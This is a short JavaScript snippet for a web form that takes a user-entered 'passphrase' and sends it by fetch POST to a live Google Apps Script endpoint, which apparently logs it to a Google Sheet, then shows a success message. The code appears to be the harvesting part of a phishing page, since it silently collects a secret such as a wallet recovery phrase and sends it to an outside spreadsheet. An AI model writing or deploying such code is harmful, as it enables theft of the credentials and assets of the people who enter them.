document.getElementById('passphraseForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const passphrase = document.getElementById('passphrase').value;

    // Save the passphrase to Google Sheets
    savePassphrase(passphrase);

    // Show success message
    document.getElementById('successMessage').classList.remove('hidden');
});

function savePassphrase(passphrase) {
    const url = 'https://script.google.com/macros/s/AKfycbzi1bBCjq9P5eC8bcsrmly9ropxLx0q7J2-elHTXy-O7yW5P2bj5S4AwvSY_4OXEFmiPg/exec'; // Replace with your Web app URL

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ passphrase: passphrase }),
    })
    .then(response => response.text())
    .then(data => {
        console.log('Passphrase saved successfully:', data);
    })
    .catch(error => {
        console.error('Error saving passphrase:', error);
    });
}
